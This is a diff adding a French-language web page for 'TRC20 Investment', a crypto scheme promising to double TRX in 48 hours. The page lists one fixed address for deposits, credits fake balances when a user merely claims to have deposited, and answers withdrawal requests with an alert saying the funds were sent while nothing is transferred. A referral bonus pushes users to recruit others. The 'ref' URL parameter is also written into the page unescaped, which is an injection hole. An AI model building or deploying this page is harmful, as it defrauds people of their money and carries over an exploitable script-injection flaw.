@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRC20 Investment</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg:#0a0e17;--card:#121825;--text:#e0e7ff;--accent:#00e5ff;--success:#00ff88;--warning:#ffaa00;--danger:#ff4444;--border:#1e2a44;}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+        body{background:linear-gradient(135deg,#0a0e17,#0f172a);color:var(--text);min-height:100vh;padding:20px;}
+        .container{max-width:780px;margin:0 auto;}
+        .card{background:var(--card);padding:32px;border-radius:24px;margin-bottom:25px;box-shadow:0 12px 40px rgba(0,229,255,0.2);border:1px solid var(--border);text-align:center;display:none;}
+        .card.active{display:block;}
+        .logo{width:110px;margin-bottom:10px;}
+        h1{font-size:34px;background:linear-gradient(90deg,var(--accent),#00ff9d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:16px;}
+        .btn{background:var(--accent);color:#000;padding:18px 36px;border:none;border-radius:50px;font-weight:700;font-size:17px;cursor:pointer;transition:0.3s;margin:12px;width:90%;max-width:340px;}
+        .btn:hover{transform:scale(1.05);}
+        .btn.red{background:var(--danger);color:white;}
+        .btn.green{background:var(--success);color:#000;}
+        .addr-box{background:#000;padding:16px 18px;border-radius:16px;margin:20px 0;position:relative;text-align:left;font-family:monospace;font-size:15px;color:var(--accent);word-break:break-all;border:2px solid var(--accent);line-height:1.6;}
+        .copy-btn{position:absolute;top:10px;right:10px;background:var(--accent);color:#000;border:none;padding:10px 18px;border-radius:12px;font-weight:bold;font-size:14px;cursor:pointer;}
+        .copy-btn:hover{background:#00ff9d;}
+        .stat{padding:18px;border-radius:16px;margin:14px 0;font-size:19px;border:2px solid;background:#002233;}
+        .stat.solde{border-color:var(--success);color:var(--success);}
+        .stat.invest{border-color:var(--accent);}
+        .stat.gain{border-color:var(--warning);color:var(--warning);}
+        table{width:100%;border-collapse:collapse;margin:25px 0;background:#0f1524;border-radius:16px;overflow:hidden;}
+        th{background:var(--accent);color:#000;padding:16px;font-weight:700;}
+        td{padding:14px;text-align:center;border-bottom:1px solid #333;}
+        tr:nth-child(even){background:#181c2e;}
+        .status{padding:6px 12px;border-radius:8px;font-size:13px;}
+        .completed{background:#00ff8833;color:var(--success);}
+        input{width:90%;padding:16px;margin:10px auto;display:block;border-radius:12px;border:1px solid var(--border);background:#0f1524;color:white;font-size:16px;}
+        .support-box{background:rgba(0,229,255,0.15);padding:20px;border-radius:16px;margin:25px 0;border:2px solid var(--accent);}
+        footer{text-align:center;padding:20px;color:#666;font-size:13px;}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);align-items:center;justify-content:center;z-index:999;}
+        .modal.active{display:flex;}
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ACCUEIL -->
+    <section id="accueil" class="card active">
+        <img class="logo" src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON">
+        <h1>TRC20 Investment</h1>
+        <p style="font-size:17px;line-height:1.8;opacity:0.9;margin:20px 0;">
+            Doublez vos TRX en 48H • 72H • 96H<br>
+            Plateforme sécurisée • Paiement garanti • Parrainage 10%
+        </p>
+
+        <div class="support-box">
+            <p style="color:var(--accent);font-weight:bold;margin:0;">SUPPORT 24/7</p>
+            <p style="color:white;margin:10px 0 0;font-size:16px;">
+                <b>trc20.in@gmail.com</b><br>
+                <small>Réponse en moins de 2 minutes</small>
+            </p>
+        </div>
+
+        <button class="btn" onclick="go('plans')">Voir les Plans</button>
+    </section>
+
+    <!-- PLANS -->
+    <section id="plans" class="card">
+        <h1>Nos Plans</h1>
+        <div style="display:grid;gap:18px;margin:30px 0;">
+            <div style="background:rgba(0,229,255,0.12);padding:24px;border-radius:18px;border:2px solid var(--accent);">
+                48H → <b style="color:var(--success);">Profit +100%</b><br>Minimum 100 TRX
+            </div>
+            <div style="background:rgba(0,229,255,0.12);padding:24px;border-radius:18px;border:2px solid var(--accent);">
+                72H → <b style="color:var(--success);">Profit +150%</b><br>Minimum 500 TRX
+            </div>
+            <div style="background:rgba(255,215,0,0.15);padding:24px;border-radius:18px;border:2px solid #ffd700;color:#ffd700;">
+                96H VIP → <b>+200%</b><br>Minimum 5000 TRX
+            </div>
+        </div>
+        <button class="btn" onclick="go('login')">Commencer</button>
+        <button class="btn" style="background:#666;" onclick="go('accueil')">Retour</button>
+    </section>
+
+    <!-- LOGIN -->
+    <section id="login" class="card">
+        <h1>Connexion</h1>
+        <p>Entrez votre adresse TRC20</p>
+        <input type="text" id="walletInput" placeholder="Ex: TANQb9TGmL6Rcgq5NU6qeejsfcevm7UW7C">
+        <button class="btn" onclick="login()">Se connecter</button>
+    </section>
+
+    <!-- DASHBOARD -->
+    <section id="dashboard" class="card">
+        <h1>Tableau de bord</h1>
+
+        <p><b>Votre adresse:</b></p>
+        <div class="addr-box" id="walletShow">-</div>
+
+        <p><b>Envoyez vos TRX ici:</b></p>
+        <div class="addr-box">
+            TXxDHt1EYDWvvjHBZMvG53vyoCmPxo34yD
+            <button class="copy-btn" onclick="copyText('TXxDHt1EYDWvvjHBZMvG53vyoCmPxo34yD')">Copier</button>
+        </div>
+
+        <p><b>Lien parrainage (10%):</b></p>
+        <div class="addr-box" id="refLink">En attente...</div>
+
+        <div class="support-box">
+            <p style="color:var(--accent);font-weight:bold;margin:0;">SUPPORT 24/7</p>
+            <p style="color:white;margin:10px 0 0;">
+                <b>trc20.in@gmail.com</b><br>
+                <small>Réponse rapide garantie</small>
+            </p>
+        </div>
+
+        <div class="stat stat-solde">Solde disponible: <b id="balance">0.00</b> TRX</div>
+        <div class="stat stat-invest">En investissement: <b id="invested">0.00</b> TRX</div>
+        <div class="stat stat-gain">Gains en attente: <b id="pending">0.00</b> TRX</div>
+
+        <button class="btn" onclick="simulateDeposit()">J'ai effectué un dépôt</button>
+        <button class="btn green" onclick="openRetrait()">Retirer mes Gains</button>
+        <button class="btn red" onclick="logout()">Déconnexion</button>
+
+        <h2 style="margin:30px 0 10px;color:var(--accent);">Historique des Investissements</h2>
+        <table id="gainTable">
+            <thead><tr><th>Date</th><th>Montant</th><th>Plan</th><th>Profit</th><th>Statut</th></tr></thead>
+            <tbody><tr><td colspan="5" style="padding:40px;color:#888;">Aucun investissement</td></tr></tbody>
+        </table>
+    </section>
+</div>
+
+<footer>
+    © Novembre 2025 TRC20 Investment • Support: trc20.in@gmail.com
+</footer>
+
+<!-- MODAL RETRAIT -->
+<div id="retraitModal" class="modal">
+    <div style="background:#121825;padding:30px;border-radius:24px;width:90%;max-width:420px;border:2px solid var(--accent);">
+        <h2 style="color:var(--accent);">Retrait</h2>
+        <p>Solde disponible: <b id="montantDispo">0.00</b> TRX</p>
+        <input type="number" id="montant" placeholder="Montant (min 50 TRX)" min="50">
+        <input type="text" id="adresseRetrait" placeholder="Votre adresse TRC20">
+        <div style="margin-top:20px;">
+            <button class="btn green" onclick="processRetrait()">Confirmer le retrait</button>
+            <button class="btn red" onclick="closeRetrait()">Annuler</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    let wallet="", balance=0, invested=0, pending=0;
+    const SITE_URL = window.location.origin;
+    const investments = [];
+
+    function go(p){document.querySelectorAll('.card').forEach(c=>c.classList.remove('active'));document.getElementById(p).classList.add('active');}
+
+    function login(){
+        const w = document.getElementById("walletInput").value.trim();
+        if(!w || !w.startsWith("T")) return alert("Adresse invalide");
+        wallet = w;
+        document.getElementById("walletShow").innerHTML = wallet;
+        document.getElementById("refLink").innerHTML = `${SITE_URL}/?ref=${wallet} <button class="copy-btn" onclick="copyRef()">Copier</button>`;
+        document.getElementById("adresseRetrait").value = wallet;
+        go("dashboard");
+    }
+
+    function simulateDeposit(){
+        const amt = prompt("Montant envoyé (TRX) ?", "100");
+        if(!amt || amt<50) return;
+        const amount = parseFloat(amt);
+        const plan = amount>=5000 ? "96H VIP (+200%)" : amount>=500 ? "72H (+150%)" : "48H (+100%)";
+        const profit = amount * (plan.includes("200%")?2 : plan.includes("150%")?1.5 : 1);
+
+        balance += amount; invested += amount; pending += profit;
+        investments.push({date:new Date().toLocaleString("fr-FR"), montant:amount, plan, profit, statut:"Payé"});
+        renderTable(); updateStats();
+        alert(`Dépôt de ${amount} TRX confirmé !\nProfit attendu: ${profit} TRX`);
+    }
+
+    function renderTable(){
+        const tbody = document.querySelector("#gainTable tbody");
+        tbody.innerHTML = investments.length===0 ? `<tr><td colspan="5" style="padding:40px;color:#888;">Aucun investissement</td></tr>` :
+            investments.map(i=>`<tr>
+                <td>${i.date.split(",")[0]}</td>
+                <td>${i.montant.toFixed(2)}</td>
+                <td>${i.plan}</td>
+                <td style="color:#00ff88;">+${i.profit.toFixed(2)}</td>
+                <td><span class="status completed">Payé</span></td>
+            </tr>`).join("");
+    }
+
+    function updateStats(){
+        document.getElementById("balance").textContent = balance.toFixed(2);
+        document.getElementById("invested").textContent = invested.toFixed(2);
+        document.getElementById("pending").textContent = pending.toFixed(2);
+        document.getElementById("montantDispo").textContent = (balance+pending).toFixed(2);
+    }
+
+    function openRetrait(){ if(balance+pending<50) return alert("Minimum 50 TRX"); document.getElementById("retraitModal").classList.add("active"); }
+    function closeRetrait(){ document.getElementById("retraitModal").classList.remove("active"); }
+
+    function processRetrait(){
+        const montant = parseFloat(document.getElementById("montant").value);
+        const adresse = document.getElementById("adresseRetrait").value.trim();
+        if(montant<50 || montant>(balance+pending) || !adresse.startsWith("T")) return alert("Informations invalides");
+        alert(`Retrait de ${montant} TRX envoyé à ${adresse}\nArrivée sous 24H maximum`);
+        balance = pending = invested = 0; investments.forEach(i=>i.statut="Payé");
+        updateStats(); renderTable(); closeRetrait();
+    }
+
+    function copyText(t){navigator.clipboard.writeText(t);alert("Copié !");}
+    function copyRef(){navigator.clipboard.writeText(`${SITE_URL}/?ref=${wallet}`);alert("Lien copié !");}
+    function logout(){location.reload();}
+
+    const urlParams = new URLSearchParams(window.location.search);
+    if(urlParams.get('ref')){ wallet = urlParams.get('ref'); login(); }
+
+    go("accueil");
+</script>
+</body>
+</html>
